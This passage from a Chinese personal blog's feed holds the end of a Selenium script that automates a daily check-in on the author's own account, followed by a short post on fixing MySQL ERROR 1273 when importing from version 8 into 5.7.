class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time.sleep(<span class="number">3</span>)  <span class="comment"># 延时加载</span></span><br><span class="line">        driver.find_element_by_id(<span class="string">'email'</span>).send_keys(username)  <span class="comment"># 填充用户名和密码</span></span><br><span class="line">        driver.find_element_by_id(<span class="string">'password'</span>).send_keys(password)</span><br><span class="line">        driver.find_element_by_xpath(<span class="string">'/html/body/div[1]/section/div/div[1]/div/form/div[4]/button'</span>).click()  <span class="comment"># 登录</span></span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        driver.find_element_by_xpath(<span class="string">'/html/body/div[2]/div/div/div[3]/button'</span>).click()   <span class="comment">#点击刚进主页弹出的弹窗</span></span><br><span class="line">        time.sleep(<span class="number">3</span>) <span class="comment">#等待两秒，点击read后网页流量是动态增加的</span></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># 未签到</span></span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"/html/body/div[1]/div/div[3]/section/div[1]/div/div/a"</span>).click()  <span class="comment"># 点击签到</span></span><br><span class="line">            print(driver.find_element_by_xpath(<span class="string">'//*[@id="swal2-content"]'</span>).text)</span><br><span class="line">            driver.find_element_by_xpath(<span class="string">"/html/body/div[7]/div/div[3]/button[1]"</span>).click()</span><br><span class="line">            print(<span class="string">"签到成功，恭喜你，幸运的boy"</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="string">"已经签到过了"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        print(<span class="string">"签到失败"</span>)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">"当前流量为："</span>+driver.find_element_by_xpath(<span class="string">"//*[@id='app']/div/div[3]/section/div[3]/div[2]/div/div[2]/div[2]/span"</span>).text+<span class="string">"G"</span>)</span><br><span class="line">    print()</span><br><span class="line">    driver.quit()</span><br><span class="line"></span><br><span class="line">checkin(<span class="string">"url"</span>,<span class="string">"账号"</span>,<span class="string">"密码"</span>)</span><br><span class="line">checkin(<span class="string">"url"</span>,<span class="string">"账号"</span>,<span class="string">"密码"</span>)</span><br></pre></td></tr></table></figure><h1 id="xie-zai-zui-hou">写在最后</h1><p>以上仅为个人总结，我也是刚接触，如有错误，请联系我更正。以后发现更多linux和python有趣的事也会分享的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qi-yin&quot;&gt;起因&lt;/h1&gt;
&lt;p&gt;前几天接触到linux中的crontab可以定时完成更换壁纸、推送本地文件到github等功能。这几天想着可不可以弄个自动签到的脚本，本来用的爬虫带cookie实现登录然后签到，但是过几天cookie失效就凉凉了。偶然的机会了
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>ERROR 1273 (HY000): Unknown collation: &#39;utf8mb4_0900_ai_ci&#39;</title>
    <link href="http://zssblog.top/2020/04/15/ERROR-1273-HY000-Unknown-collation-utf8mb4-0900-ai-ci/"/>
    <id>http://zssblog.top/2020/04/15/ERROR-1273-HY000-Unknown-collation-utf8mb4-0900-ai-ci/</id>
    <published>2020-04-15T13:21:41.000Z</published>
    <updated>2020-05-31T10:13:31.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qi-yin">起因</h1><p>本地数据库迁移到服务器出错，特此记录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1273 (HY000): Unknown collation: <span class="string">'utf8mb4_0900_ai_ci'</span></span><br></pre></td></tr></table></figure><h1 id="pei-zhi">配置</h1><p>本地：mysql  8.0.19<br>服务器：mysql 5.7.29</p><h1 id="jie-jue-fang-fa">解决方法</h1><p>因为是<strong>高版本导入到低版本</strong>，引起1273错误</p><p>打开sql文件，将文件中的所有<br>utf8mb4_0900_ai_ci替换为utf8_general_ci</p><p>utf8mb4替换为utf8<br>保存后重新在服务器运行sql文件即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;qi-yin&quot;&gt;起因&lt;/h1&gt;
&lt;p&gt;本地数据库迁移到服务器出错，特此记录下。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
</feed>
